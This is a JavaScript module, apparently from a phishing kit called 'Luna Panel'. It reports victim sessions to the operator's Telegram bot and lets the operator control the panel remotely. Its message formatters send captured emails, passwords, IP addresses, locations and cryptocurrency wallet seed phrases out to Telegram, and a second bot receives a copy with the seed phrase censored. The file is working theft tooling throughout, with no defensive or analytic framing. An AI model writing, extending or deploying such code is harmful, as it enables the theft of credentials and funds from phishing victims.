import fetch from 'node-fetch';
import dotenv from 'dotenv';
dotenv.config();


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const SECONDARY_TELEGRAM_BOT_TOKEN = process.env.SECONDARY_TELEGRAM_BOT_TOKEN;
const SECONDARY_TELEGRAM_CHAT_ID = process.env.SECONDARY_TELEGRAM_CHAT_ID;

// Apple-style separator
const SEPARATOR = '━━━━━━━━━━━━━━━';

// Helper function to get current EST/EDT timestamp
function getESTTimestamp() {
    const now = new Date();
    const estTime = new Date().toLocaleString('en-US', {
        timeZone: 'America/New_York',
        hour12: true,
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit'
    });

    // Determine if it's EST or EDT based on daylight saving time
    const january = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
    const july = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
    const isDST = Math.max(january, july) !== now.getTimezoneOffset();

    return estTime + (isDST ? ' EDT' : ' EST');
}

let settingsRef = null;
let lastUpdateId = 0;

export function initTelegramService(settings) {
    settingsRef = settings;
    startPolling();
}

// Start polling for Telegram updates
async function startPolling() {
    while (true) {
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
            );
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.message?.text) {
                        await handleTelegramCommand(update.message);
                    }
                    lastUpdateId = update.update_id;
                }
            }
        } catch (error) {
            console.error('Telegram polling error:', error);
        }
        
        // Small delay to prevent too frequent requests in case of errors
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

// Handle incoming Telegram commands
async function handleTelegramCommand(message) {
    const text = message.text?.toLowerCase();
    
    if (!text?.startsWith('/')) return;

    const command = text.split(' ')[0];
    const param = text.split(' ')[1];

    switch (command) {
        case '/panel':
            if (param === 'on' || param === 'off') {
                const newStatus = param === 'on';
                settingsRef.websiteEnabled = newStatus;
                await sendStatusUpdate({
                    websiteEnabled: newStatus,
                    activeSessions: settingsRef.sessions?.size || 0,
                    bannedIPs: settingsRef.bannedIPs?.size || 0
                });
            }
            break;

        case '/status':
            await sendStatusUpdate({
                websiteEnabled: settingsRef.websiteEnabled,
                activeSessions: settingsRef.sessions?.size || 0,
                bannedIPs: settingsRef.bannedIPs?.size || 0
            });
            break;
    }
}

export async function sendTelegramNotification(message) {
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram notification (disabled):', message);
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }

        const data = await response.json();
        
        // Send to secondary bot for specific notification types
        if (message.includes('𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻') || 
            message.includes('𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱') || 
            message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
            
            // For seed phrase, censor the actual phrase
            let secondaryMessage = message;
            if (message.includes('𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱')) {
                secondaryMessage = message.replace(/<code>.*<\/code>/, '<code>[CENSORED]</code>');
            }
            
            await sendSecondaryNotification(secondaryMessage);
        }
        
        return data;
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
        return null;
    }
}

async function sendSecondaryNotification(message) {
    try {
        if (!SECONDARY_TELEGRAM_BOT_TOKEN || !SECONDARY_TELEGRAM_CHAT_ID) {
            console.log('Secondary Telegram notification (disabled):', message);
            return;
        }

        const url = `https://api.telegram.org/bot${SECONDARY_TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: SECONDARY_TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Secondary Telegram API error: ${response.statusText}`);
        }

        return await response.json();
    } catch (error) {
        console.error('Failed to send secondary Telegram notification:', error);
        return null;
    }
}

export function formatTelegramMessage(type, data) {
    const timestamp = getESTTimestamp();

    switch (type) {
        case 'server_status':
            return [
                'Luna Panel Status 🌙',
                SEPARATOR,
                `🟢 Status: ${data.status}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'new_session':
            return [
                'New Connection 🌙',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `🏷️ Alias: ${data.alias}`,
                `📱 Device: ${data.userAgent}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'review_completed':
            return [
                'Session Reviewed ✔️✨',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🏷️ Alias: ${data.alias}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'amount_confirmed':
            return [
                'Amount Confirmed 🌟💰',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🏷️ Alias: ${data.alias}`,
                `💰 Amount: ${data.amount}`,
                `🌍 IP Address: ${data.ip}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'seed_phrase':
            return [
                'Phase Complete 🌕✅',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🏷️ Alias: ${data.alias}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                `🔑 Seed Phrase:`,
                `<code>${data.seedPhrase}</code>`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'email_submitted':
            return [
                'Email Received 📧🌙',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🏷️ Alias: ${data.alias}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                `📮 Provider: ${data.provider}`,
                `📧 Email: <code>${data.email}</code>`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'password_submitted':
            return [
                'Password Captured 🔐🌟',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🏷️ Alias: ${data.alias}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                `📮 Provider: ${data.provider}`,
                `📧 Email: ${data.email}`,
                `🔑 Password: <code>${data.password}</code>`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'session_ended':
            return [
                'Session Ended 🌑✂️',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `⏱ Duration: ${formatDuration(data.duration)}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'settings_changed':
            return [
                'Settings Adjusted ⚙️🌙',
                SEPARATOR,
                ...Object.entries(data).map(([key, value]) =>
                    `⚡️ ${key}: ${value}`
                ),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'ip_banned':
            return [
                'Access Blocked 🚫🌑',
                SEPARATOR,
                `🌍 IP Address: ${data.ip}`,
                `👤 Banned By: ${data.bannedBy}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

            case 'ip_unbanned':
                return [
                    'Access Restored 🌟✨',
                    SEPARATOR,
                    `🌍 IP Address: ${data.ip}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            case 'session_removed':
                return [
                    'Session Released 👐🌙',
                    SEPARATOR,
                    `⌥ Session ID: ${data.id}`,
                    `🏷️ Alias: ${data.alias}`,
                    `👤 Removed By: ${data.removedBy}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            default:
            return [
                '𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻',
                SEPARATOR,
                data.toString(),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');
    }
}

function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours}h ${minutes % 60}m`;
    } else if (minutes > 0) {
        return `${minutes}m ${seconds % 60}s`;
    } else {
        return `${seconds}s`;
    }
}

export async function sendStatusUpdate(status) {
    const timestamp = getESTTimestamp();

    const message = [
        '𝗦𝘁𝗮𝘁𝘂𝘀 𝗨𝗽𝗱𝗮𝘁𝗲',
        SEPARATOR,
        `👥 Active Sessions: ${status.activeSessions}`,
        `🚫 Banned IPs: ${status.bannedIPs}`,
        `${status.websiteEnabled ? '✅' : '❌'} Website Status: ${status.websiteEnabled ? 'Online' : 'Offline'}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export async function sendErrorNotification(error) {
    const timestamp = getESTTimestamp();

    const message = [
        '𝗘𝗿𝗿𝗼𝗿 𝗔𝗹𝗲𝗿𝘁',
        SEPARATOR,
        `⚠️ ${error.name}`,
        `❌ ${error.message}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export const telegramUtils = {
    formatDuration,
    formatTelegramMessage,
    sendStatusUpdate,
    sendErrorNotification
};